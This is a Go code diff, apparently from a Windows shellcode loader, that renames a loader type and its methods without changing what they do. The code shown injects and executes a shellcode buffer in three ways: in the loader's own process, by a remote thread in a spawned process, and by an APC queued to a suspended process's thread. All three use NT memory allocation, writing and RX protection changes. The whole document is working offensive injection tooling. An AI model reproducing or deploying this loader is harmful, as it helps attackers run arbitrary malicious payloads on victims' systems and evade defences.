@@ -8,14 +8,14 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func (pl *Loader) SelfInjectThread(scbuf []byte) error {
+func (ldr *loader) selfInjectThread(scbuf []byte) error {
 	var (
 		err        error
 		scBaseAddr uintptr
 		hThread    uintptr
 	)
 	hSelf := uintptr(0xffffffffffffffff) // handle to current proc
-	scBaseAddr, err = pl.NtAllocateVirtualMemory(
+	scBaseAddr, err = ldr.NtAllocateVirtualMemory(
 		hSelf,
 		scBaseAddr,
 		len(scbuf),
@@ -27,19 +27,19 @@ func (pl *Loader) SelfInjectThread(scbuf []byte) error {
 	}
 	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)
 
-	// memory.WriteMemory(scbuf, scBaseAddr)
-	if _, err := pl.NtWriteVirtualMemory(hSelf, scBaseAddr, scbuf, len(scbuf)); err != nil {
+	// writeMemory(scbuf, scBaseAddr)
+	if _, err := ldr.NtWriteVirtualMemory(hSelf, scBaseAddr, scbuf, len(scbuf)); err != nil {
 		return err
 	}
 	fmt.Println("Shellcode copied to allocated memory")
 
 	fmt.Println("Changing memory protection to RX")
-	if _, err := pl.NtProtectVirtualMemory(hSelf, scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
+	if _, err := ldr.NtProtectVirtualMemory(hSelf, scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
 		return err
 	}
 
 	fmt.Println("Creating thread to exec shellcode ...")
-	hThread, err = pl.NtCreateThreadEx(hThread, hSelf, scBaseAddr)
+	hThread, err = ldr.NtCreateThreadEx(hThread, hSelf, scBaseAddr)
 	if err != nil {
 		return err
 	}
@@ -50,7 +50,7 @@ func (pl *Loader) SelfInjectThread(scbuf []byte) error {
 	return nil
 }
 
-func (pl *Loader) RemoteThreadInject(scbuf []byte) error {
+func (ldr *loader) remoteThreadInject(scbuf []byte) error {
 	var (
 		err        error
 		scBaseAddr uintptr
@@ -62,7 +62,7 @@ func (pl *Loader) RemoteThreadInject(scbuf []byte) error {
 		return err
 	}
 
-	scBaseAddr, err = pl.NtAllocateVirtualMemory(
+	scBaseAddr, err = ldr.NtAllocateVirtualMemory(
 		uintptr(pi.Process),
 		scBaseAddr,
 		len(scbuf),
@@ -74,19 +74,19 @@ func (pl *Loader) RemoteThreadInject(scbuf []byte) error {
 	}
 	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)
 
-	// memory.WriteMemory(scbuf, scBaseAddr)
-	if _, err := pl.NtWriteVirtualMemory(uintptr(pi.Process), scBaseAddr, scbuf, len(scbuf)); err != nil {
+	// writeMemory(scbuf, scBaseAddr)
+	if _, err := ldr.NtWriteVirtualMemory(uintptr(pi.Process), scBaseAddr, scbuf, len(scbuf)); err != nil {
 		return err
 	}
 	fmt.Println("Shellcode copied to allocated memory")
 
 	fmt.Println("Changing memory protection to RX")
-	if _, err := pl.NtProtectVirtualMemory(uintptr(pi.Process), scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
+	if _, err := ldr.NtProtectVirtualMemory(uintptr(pi.Process), scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
 		return err
 	}
 
 	fmt.Println("Creating thread to exec shellcode ...")
-	_, err = pl.NtCreateThreadEx(uintptr(pi.Thread), uintptr(pi.Process), scBaseAddr)
+	_, err = ldr.NtCreateThreadEx(uintptr(pi.Thread), uintptr(pi.Process), scBaseAddr)
 	if err != nil {
 		return err
 	}
@@ -100,7 +100,7 @@ func (pl *Loader) RemoteThreadInject(scbuf []byte) error {
 	return nil
 }
 
-func (pl *Loader) QueueUserAPC(scbuf []byte) error {
+func (ldr *loader) queueUserAPC(scbuf []byte) error {
 	var (
 		err        error
 		scBaseAddr uintptr
@@ -112,7 +112,7 @@ func (pl *Loader) QueueUserAPC(scbuf []byte) error {
 	}
 	fmt.Printf("Created suspended process ...\n")
 
-	scBaseAddr, err = pl.NtAllocateVirtualMemory(
+	scBaseAddr, err = ldr.NtAllocateVirtualMemory(
 		uintptr(pi.Process),
 		scBaseAddr,
 		len(scbuf),
@@ -124,18 +124,18 @@ func (pl *Loader) QueueUserAPC(scbuf []byte) error {
 	}
 	fmt.Printf("Base address of allocated memory: 0x%016x\n", scBaseAddr)
 
-	if _, err := pl.NtWriteVirtualMemory(uintptr(pi.Process), scBaseAddr, scbuf, len(scbuf)); err != nil {
+	if _, err := ldr.NtWriteVirtualMemory(uintptr(pi.Process), scBaseAddr, scbuf, len(scbuf)); err != nil {
 		return err
 	}
 	fmt.Println("Writing shellcode to allocated memory")
 
 	fmt.Println("Changing memory protection to RX")
-	if _, err := pl.NtProtectVirtualMemory(uintptr(pi.Process), scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
+	if _, err := ldr.NtProtectVirtualMemory(uintptr(pi.Process), scBaseAddr, len(scbuf), windows.PAGE_EXECUTE_READ, windows.PAGE_READWRITE); err != nil {
 		return err
 	}
 
 	fmt.Println("Adding thread to APC queue ...")
-	if _, err := pl.NtQueueApcThread(uintptr(pi.Thread), scBaseAddr); err != nil {
+	if _, err := ldr.NtQueueApcThread(uintptr(pi.Thread), scBaseAddr); err != nil {
 		return err
 	}
 
